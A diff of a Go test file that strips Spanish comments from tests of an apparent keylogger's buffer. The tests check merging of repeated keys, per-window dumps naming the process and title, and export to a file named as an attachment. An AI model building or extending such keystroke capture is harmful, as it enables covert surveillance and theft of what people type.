@@ -23,9 +23,6 @@ func specialAt(at time.Time, label string) win32.KeyEvent {
 	return win32.KeyEvent{Timestamp: at, IsSpecial: true, Label: label}
 }
 
-// TestAutoRepeatSeFunde reproduce el bug reportado: mantener la flecha derecha
-// en una página generaba [VK:0x27] dieciséis veces seguidas. Con el mapa y el
-// fundido, el dump queda en una sola línea con el contador.
 func TestAutoRepeatSeFunde(t *testing.T) {
 	buffer := &KeylogBuffer{}
 	base := stampAt("2026-11-23 14:32:01")
@@ -34,7 +31,6 @@ func TestAutoRepeatSeFunde(t *testing.T) {
 	for _, r := range "hola" {
 		buffer.Append(win32.KeyEvent{Timestamp: base, Rune: r})
 	}
-	// 16 repeticiones del sistema, 33 ms entre cada una (auto-repeat real).
 	for i := 0; i < 16; i++ {
 		buffer.Append(specialAt(base.Add(time.Duration(i)*33*time.Millisecond), "[RIGHT]"))
 	}
@@ -52,8 +48,6 @@ func TestAutoRepeatSeFunde(t *testing.T) {
 	t.Logf("dump:\n%s", dump)
 }
 
-// TestPulsacionesSeparadasNoSeFunden: dos pulsaciones humanas de la misma tecla
-// (>250 ms) siguen siendo dos marcas.
 func TestPulsacionesSeparadasNoSeFunden(t *testing.T) {
 	buffer := &KeylogBuffer{}
 	base := stampAt("2026-11-23 14:32:01")
@@ -71,8 +65,6 @@ func TestPulsacionesSeparadasNoSeFunden(t *testing.T) {
 	}
 }
 
-// TestFormatoDumpExacto mantiene el formato pedido: header UTC con proceso y
-// título, especiales inline, sesiones vacías fuera.
 func TestFormatoDumpExacto(t *testing.T) {
 	buffer := &KeylogBuffer{}
 	first := stampAt("2026-11-23 14:32:01")
@@ -87,7 +79,6 @@ func TestFormatoDumpExacto(t *testing.T) {
 	}
 	buffer.Append(specialAt(first, "[CTRL+C]"))
 
-	// Ventana sin teclas: no puede aparecer.
 	buffer.StartSession("explorer.exe", "Escritorio", stampAt("2026-11-23 14:33:00"))
 
 	second := stampAt("2026-11-23 14:33:45")
@@ -112,7 +103,6 @@ func TestFormatoDumpExacto(t *testing.T) {
 	}
 }
 
-// TestDumpToFileUTF8 cubre el nombre del adjunto y un layout no latino.
 func TestDumpToFileUTF8(t *testing.T) {
 	buffer := &KeylogBuffer{}
 	at := stampAt("2026-11-23 09:05:07")
